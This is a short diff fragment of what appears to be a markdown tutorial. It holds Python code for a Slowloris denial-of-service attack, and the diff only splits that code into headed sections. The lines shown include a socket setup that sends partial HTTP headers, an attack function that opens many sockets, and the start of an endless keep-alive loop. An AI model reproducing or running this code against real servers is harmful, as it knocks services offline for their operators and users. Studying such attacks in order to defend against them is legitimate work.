@@ -118,7 +118,13 @@ def create_socket():
     s.send("User-Agent: Mozilla/5.0\r\n".encode())
     s.send("Accept: text/html\r\n".encode())
     return s
+```
 
+---
+
+## Python Implementation: Attack Function
+
+```python
 def slowloris_attack():
     sockets_list = []
 
@@ -132,7 +138,13 @@ def slowloris_attack():
             print(f"[-] Failed to create socket: {e}")
 
     print(f"[+] {len(sockets_list)} sockets connected")
+```
 
+---
+
+## Python Implementation: Keep-Alive Loop
+
+```python
     # Phase 2: Keep connections alive
     while True:
         print(f"[*] Sending keep-alive headers... "
